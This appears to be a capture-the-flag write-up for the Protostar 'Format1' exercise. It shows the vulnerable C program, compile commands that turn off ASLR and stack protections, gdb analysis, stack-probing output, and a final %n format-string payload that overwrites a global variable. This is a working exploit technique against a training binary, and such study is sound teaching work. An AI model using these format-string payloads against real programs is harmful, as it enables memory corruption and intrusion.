## Protostar-Format1 Solution

### 1. Introduction

This is a poc solution for the "Format1" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419031451/https://exploit-exercises.com/protostar/format1/](https://web.archive.org/web/20170419031451/https://exploit-exercises.com/protostar/format1/) 
 
**Hints:**
* This level shows how format strings can be used to modify arbitrary memory locations.

* objdump -t is your friend, and your input string lies far up the stack :)

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_1 format_1.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb

1. Silently (-q) start with gdb.
2. Disassemble the main and vuln functions.
3. Check address of the target variable.

It's not easy to overwrite target variable since it's far away from stack as mentioned on "Hints".

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048475 <+0>:	push   ebp
   0x08048476 <+1>:	mov    ebp,esp
   0x08048478 <+3>:	and    esp,0xfffffff0
   0x0804847b <+6>:	sub    esp,0x10
   0x0804847e <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048481 <+12>:	add    eax,0x4
   0x08048484 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048486 <+17>:	mov    DWORD PTR [esp],eax
   0x08048489 <+20>:	call   0x804844d <vuln>
   0x0804848e <+25>:	leave  
   0x0804848f <+26>:	ret    
End of assembler dump.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804844d <+0>:	push   ebp
   0x0804844e <+1>:	mov    ebp,esp
   0x08048450 <+3>:	sub    esp,0x18
   0x08048453 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048456 <+9>:	mov    DWORD PTR [esp],eax
   0x08048459 <+12>:	call   0x8048310 <printf@plt>
   0x0804845e <+17>:	mov    eax,ds:0x804a028
   0x08048463 <+22>:	test   eax,eax
   0x08048465 <+24>:	je     0x8048473 <vuln+38>
   0x08048467 <+26>:	mov    DWORD PTR [esp],0x8048520
   0x0804846e <+33>:	call   0x8048320 <puts@plt>
   0x08048473 <+38>:	leave  
   0x08048474 <+39>:	ret    
End of assembler dump.
(gdb) b main
(gdb) r aaaaaa
Starting program: format_1 aaaaaa
Breakpoint 1, main (argc=2, argv=0xffffd194) at format_1.c:19
19	  vuln(argv[1]);

(gdb) i address target
Symbol "target" is static storage at address 0x804a028.
```

Target address in the little-endian format = **\x28\xa0\x04\x08**

Let's check what happens if we modify the program flow.

```nasm
$ gdb -q format_1
Reading symbols from format_1...done.
(gdb) b *0x0804845e
Breakpoint 1 at 0x804845e: file format_1.c, line 12.
(gdb) r AAAAAA
Starting program:format_1 AAAAAA

Breakpoint 1, vuln (string=0xffffd38e "AAAAAA") at format_1.c:12
12	  if(target) {
(gdb) si
0x08048463	12	  if(target) {
(gdb) disas
Dump of assembler code for function vuln:
   0x0804844d <+0>:	push   ebp
   0x0804844e <+1>:	mov    ebp,esp
   0x08048450 <+3>:	sub    esp,0x18
   0x08048453 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048456 <+9>:	mov    DWORD PTR [esp],eax
   0x08048459 <+12>:	call   0x8048310 <printf@plt>
   0x0804845e <+17>:	mov    eax,ds:0x804a028
=> 0x08048463 <+22>:	test   eax,eax
   0x08048465 <+24>:	je     0x8048473 <vuln+38>
   0x08048467 <+26>:	mov    DWORD PTR [esp],0x8048520
   0x0804846e <+33>:	call   0x8048320 <puts@plt>
   0x08048473 <+38>:	leave  
   0x08048474 <+39>:	ret    
End of assembler dump.
(gdb)  set $eax=1
(gdb) i r eax
eax            0x1	1
(gdb) c
Continuing.
AAAAAAyou have modified the target :)
[Inferior 1 (process 3336) exited with code 040]
```

It's also possible to manipulate flags or editing binary itself via hex editor...

#### 2.2 Quick Solution
 
We found that **\x28\xa0\x04\x08** is the target variable address.

Our plan is to overwrite values on the target variable address. Let's start by checking offset, I went with blackbox approach this time since I did whitebox on stack solutions enough.

The input parameter of printf() is stored on the stack, but it's not in the same stack frame. 
It's obvious that there is a format string vulnerability as seen the output below:

```
$ ./format_1 aaaaaaaaaaaa
aaaaaaaaaaaa
$ ./format_1 %d
47
```

If the string contains a format specifier, then argument is fetched from stack. 
Let's find the offset by increasing the number of inputs until we see our input.

```
$ ./format_1 $(python -c 'print "AAAAAA"+"%x|"*200' ) | grep 41414141
AAAAAA2f|804a000|80484e2|2|ffffcf74|ffffced8|804848e|ffffd148|f7ffd000|804849b|f7fbc000|8048490|0|0|f7e2bad3|2|ffffcf74|ffffcf80|f7feae6a|2|ffffcf74|ffffcf14|804a018|804822c|f7fbc000|0|0|0|1e9576cb|247d92db|0|0|0|2|8048350|0|f7ff0660|f7e2b9e9|f7ffd000|2|8048350|0|8048371|8048475|2|ffffcf74|8048490|8048500|f7feb300|ffffcf6c|1c|2|ffffd13d|ffffd148|0|ffffd3a7|ffffd3b2|ffffd3c4|ffffd3da|ffffd3eb|ffffd418|ffffd435|ffffd444|ffffd479|ffffd484|ffffd494|ffffd4ab|ffffd4bc|ffffd4ce|ffffd512|ffffd546|ffffd575|ffffd57c|ffffda9d|ffffdad7|ffffdb0b|ffffdb3b|ffffdb8d|ffffdbc0|ffffdc04|ffffdc62|ffffdc79|ffffdc8b|ffffdcac|ffffdcb5|ffffdcd3|ffffdce7|ffffdcfe|ffffdd0f|ffffdd1e|ffffdd54|ffffdd66|ffffdd83|ffffdd95|ffffddaf|ffffddbe|ffffddcb|ffffddd3|ffffdde2|ffffde0e|ffffde18|ffffde32|ffffde81|ffffde93|ffffdecf|ffffdeef|ffffdef9|ffffdf0e|ffffdf2d|ffffdf38|ffffdf52|ffffdf65|ffffdf87|ffffdfa8|ffffdfc1|ffffdfe0|0|20|f7fdacd0|21|f7fda000|10|1f8bfbff|6|1000|11|64|3|8048034|4|20|5|9|7|f7fdc000|8|0|9|8048350|b|3e8|c|3e8|d|3e8|e|3e8|17|0|19|ffffd11b|1f|ffffdfed|f|ffffd12b|0|0|a000000|5bad0c9a|5b9a7084|fa07f5bd|6973cada|363836|0|0|0|662f2e00|616d726f|315f74===>|41414141| <===78254141|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|
```

Okay, whether I changed number of %x format specifier, it was not helpful. So I used following to find right value.

```
$ ./format_1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"+"%x|"*181' )
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH2f|804a000|80484e2|2|ffffcf74|ffffced8|804848e|ffffd158|f7ffd000|804849b|f7fbc000|8048490|0|0|f7e2bad3|2|ffffcf74|ffffcf80|f7feae6a|2|ffffcf74|ffffcf14|804a018|804822c|f7fbc000|0|0|0|a1424fd9|9baaabc9|0|0|0|2|8048350|0|f7ff0660|f7e2b9e9|f7ffd000|2|8048350|0|8048371|8048475|2|ffffcf74|8048490|8048500|f7feb300|ffffcf6c|1c|2|ffffd14d|ffffd158|0|ffffd398|ffffd3a3|ffffd3b5|ffffd3cb|ffffd3dc|ffffd409|ffffd426|ffffd435|ffffd46a|ffffd475|ffffd485|ffffd49c|ffffd4ad|ffffd4bf|ffffd503|ffffd537|ffffd566|ffffd56d|ffffda8e|ffffdac8|ffffdafc|ffffdb2c|ffffdb7e|ffffdbb1|ffffdbf5|ffffdc53|ffffdc6a|ffffdc7c|ffffdc9d|ffffdca6|ffffdcc4|ffffdcd8|ffffdcef|ffffdd00|ffffdd0f|ffffdd45|ffffdd57|ffffdd74|ffffdd86|ffffdda0|ffffddaf|ffffddbc|ffffddc4|ffffddd3|ffffddff|ffffde09|ffffde23|ffffde72|ffffde84|ffffdec0|ffffdee0|ffffdeea|ffffdeff|ffffdf1e|ffffdf29|ffffdf43|ffffdf56|ffffdf78|ffffdf99|ffffdfb2|ffffdfd1|ffffdfe0|0|20|f7fdacd0|21|f7fda000|10|1f8bfbff|6|1000|11|64|3|8048034|4|20|5|9|7|f7fdc000|8|0|9|8048350|b|3e8|c|3e8|d|3e8|e|3e8|17|0|19|ffffd12b|1f|ffffdfed|f|ffffd13b|0|0|0|0|0|a000000|c782b05e|f9132f6f|c100e28a|697e9cad|363836|0|0|0|662f2e00|616d726f|315f74|41414141|42424242|43434343|44444444|45454545|46464646|47474747|48484848|
```

Now, let's use %n format specifier instead of %x to write. It is used to get the number of characters before **%n**.
Following info is from printf(3)'s manual page.
```
n      The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is converted.

```
$ ./format_1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"+"%x|"*181' )
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH2f|804a000|80484e2|2|ffffcf74|ffffced8|804848e|ffffd158|f7ffd000|804849b|f7fbc000|8048490|0|0|f7e2bad3|2|ffffcf74|ffffcf80|f7feae6a|2|ffffcf74|ffffcf14|804a018|804822c|f7fbc000|0|0|0|a1424fd9|9baaabc9|0|0|0|2|8048350|0|f7ff0660|f7e2b9e9|f7ffd000|2|8048350|0|8048371|8048475|2|ffffcf74|8048490|8048500|f7feb300|ffffcf6c|1c|2|ffffd14d|ffffd158|0|ffffd398|ffffd3a3|ffffd3b5|ffffd3cb|ffffd3dc|ffffd409|ffffd426|ffffd435|ffffd46a|ffffd475|ffffd485|ffffd49c|ffffd4ad|ffffd4bf|ffffd503|ffffd537|ffffd566|ffffd56d|ffffda8e|ffffdac8|ffffdafc|ffffdb2c|ffffdb7e|ffffdbb1|ffffdbf5|ffffdc53|ffffdc6a|ffffdc7c|ffffdc9d|ffffdca6|ffffdcc4|ffffdcd8|ffffdcef|ffffdd00|ffffdd0f|ffffdd45|ffffdd57|ffffdd74|ffffdd86|ffffdda0|ffffddaf|ffffddbc|ffffddc4|ffffddd3|ffffddff|ffffde09|ffffde23|ffffde72|ffffde84|ffffdec0|ffffdee0|ffffdeea|ffffdeff|ffffdf1e|ffffdf29|ffffdf43|ffffdf56|ffffdf78|ffffdf99|ffffdfb2|ffffdfd1|ffffdfe0|0|20|f7fdacd0|21|f7fda000|10|1f8bfbff|6|1000|11|64|3|8048034|4|20|5|9|7|f7fdc000|8|0|9|8048350|b|3e8|c|3e8|d|3e8|e|3e8|17|0|19|ffffd12b|1f|ffffdfed|f|ffffd13b|0|0|0|0|0|a000000|c782b05e|f9132f6f|c100e28a|697e9cad|363836|0|0|0|662f2e00|616d726f|315f74|41414141|42424242|43434343|44444444|45454545|46464646|47474747|48484848|

$ ./format_1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGG" + "\x28\xa0\x04\x08" + "%x|"*181 + "%n"' )

It did not work after severak attempts and analysis then I switched back to ubuntu 20.04 again;

```
$ objdump -t ./format_1 | grep target
0804c024 g     O .bss	00000004              target

gdb-peda$ r $(python -c 'print "A"*8+"\x24\xc0\x04\x08"+"A"*8+"%175$x"')
Starting program: format_1 $(python -c 'print "A"*8+"\x24\xc0\x04\x08"+"A"*8+"%175$x"')
AAAAAAAA$AAAAAAAA804c024[Inferior 1 (process 8049) exited normally]
```

#### 2.3 Final PoC

```
$(python -c 'print "\x24\xc0\x04\x08"+"%166$x"')
$804c024

$(python -c 'print "\x24\xc0\x04\x08"+"%166$n"')
$you have modified the target :)
 ```
